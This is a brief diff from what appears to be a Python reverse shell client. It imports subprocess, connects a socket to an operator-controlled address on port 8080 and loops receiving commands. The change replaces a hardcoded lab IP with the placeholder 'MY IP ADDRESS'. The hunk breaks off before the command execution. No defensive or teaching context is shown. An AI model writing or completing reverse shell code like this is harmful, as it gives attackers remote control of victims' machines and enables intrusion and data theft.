@@ -4,7 +4,7 @@ import subprocess
 
 def connect():
     Mysocket = socket.socket()
-    Mysocket.connect(("192.168.81.128", 8080))
+    Mysocket.connect(("MY IP ADDRESS", 8080))
 
     while True:
         command = Mysocket.recv(1024)
